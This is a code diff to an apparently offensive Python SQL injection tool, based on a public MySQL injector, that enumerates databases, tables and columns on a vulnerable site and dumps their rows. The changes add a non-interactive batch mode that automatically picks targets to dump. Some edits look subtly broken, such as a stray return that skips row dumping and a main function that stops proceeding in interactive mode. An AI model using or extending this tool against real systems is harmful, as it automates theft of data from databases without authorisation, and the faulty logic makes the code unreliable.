@@ -39,7 +39,6 @@ try:
 except:
 	pass
 from src.data import arg
-
 #Reference: https://github.com/GreySec/MySQL-Injector/blob/master/mysql-injector.py
 ip = 1
 dump_array = []
@@ -59,9 +58,7 @@ column_vulnerable = 0
 version = "1.1"
 
 def clear():
-	os.system('cls' if os.name == 'nt' else 'clear')
-	print(logo)
-	print()
+	pass
 
 proxy = 0
 if proxy:
@@ -92,8 +89,10 @@ def save(table = ""):
 			return
 		except:
 			print(prefix + "[-] Error while saving dump .. ")
-			path = input(prefix + "Enter other path to save dump: ")
-
+			if not arg.batch:
+				path = input(prefix + "Enter other path to save dump: ")
+			else:
+				path = "dumps"
 def debug(text,filename):
 	return
 	path = os.path.expanduser('~') + "/Desktop/" + filename
@@ -432,8 +431,20 @@ def get_databases():
 			print(prefix + str(key) + "\t" + value)
 	print()
 	temp_clear()
-	
-	get_tables(input(prefix + "Insert database id to continue: "))
+	if not arg.batch:
+		if arg.tables:
+			get_tables(input(prefix + "Insert database id to continue: "))
+			return
+		get_tables(input(prefix + "Insert database id to continue: "))
+		return
+	else:
+		if arg.tables:
+			_ = iter(database_list.keys())
+			get_tables(next(_))
+			return
+		_ = iter(database_list.keys())
+		get_tables(next(_))
+		
 
 def get_tables(database_id):
 
@@ -441,6 +452,9 @@ def get_tables(database_id):
 		get_databases()
 		return
 	else:
+		if arg.dbs:
+			database_id = int(database_id)
+			return
 		database_id = int(database_id)
 		
 	database = database_list[database_id]
@@ -457,7 +471,8 @@ def get_tables(database_id):
 			count = int(re.search("~~(.*?)~~", temp).groups()[0])
 			if count == 0:
 				clear()
-				input(prefix + "No tables found, press enter to return .. ")
+				if not arg.batch:
+					input(prefix + "No tables found, press enter to return .. ")
 				get_databases()
 				return
 			
@@ -512,8 +527,11 @@ def get_tables(database_id):
 	get_columns(database_id)
 	
 def get_columns(database_id):
-	
-	table_id = input(prefix + "Insert table id to continue: ")
+	if not arg.batch:
+		table_id = input(prefix + "Insert table id to continue: ")
+	else:
+		table_id = iter(table_list[database_id].keys())
+		table_id = next(table_id)
 	if not table_id:
 		get_databases()
 		return
@@ -584,14 +602,18 @@ def get_columns(database_id):
 
 	print()
 	temp_clear()
-	
-	column_ids = input(prefix + "Insert column id's to dump: ")
+	if not arg.batch:
+		column_ids = input(prefix + "Insert column id to dump: ")
+			
+	else:
+		column_ids = iter(column_list[table_id].keys())
+		column_ids = str(next(column_ids))
 	if not column_ids:
 		get_tables(database_id)
 		return
 	else:
 		column_names = []
-		column_id_array = column_ids.replace(" ","").split(',');
+		column_id_array = column_ids.replace(" ","").split(',')
 		for column_id in column_id_array:
 			column_id = int(column_id)
 			column_names.append(column_list[table_id][column_id])
@@ -632,10 +654,13 @@ def dump(column_names,table_name,database_name,database_id):
 		count = int(re.search("~~(.*?)~~", temp).groups()[0])
 		if count == 0:
 			clear()
-			input(prefix + "No rows to dump, press enter to return .. ")
+			if not arg.batch:
+				input(prefix + "No rows to dump, press enter to return .. ")
+				return
 			get_tables(database_id)
 			return
 		print(prefix + "[i] Dumping row: " + str(len(dump_array)) + "/" + str(count))
+		return
 	else:
 		print(prefix + "[-] Could not get rows, exiting .. ")
 		print()
@@ -676,7 +701,8 @@ def dump(column_names,table_name,database_name,database_id):
 		print(prefix + item)
 
 	save(table_name)
-	input(prefix + "Press enter to continue .. ")
+	if not arg.batch:
+		input(prefix + "Press enter to continue .. ")
 	del dump_array[:]
 	get_databases()
 	
@@ -698,8 +724,10 @@ def main():
 		print(prefix + "[-] Could not find vulnerabilities, exiting .. ")
 		print()
 		exit()
-	input(prefix + "Press enter to get databases .. ")
-	get_databases()
+	if not arg.batch:
+		input(prefix + "Press enter to get databases .. ")
+	else:
+		get_databases()
 
 
 
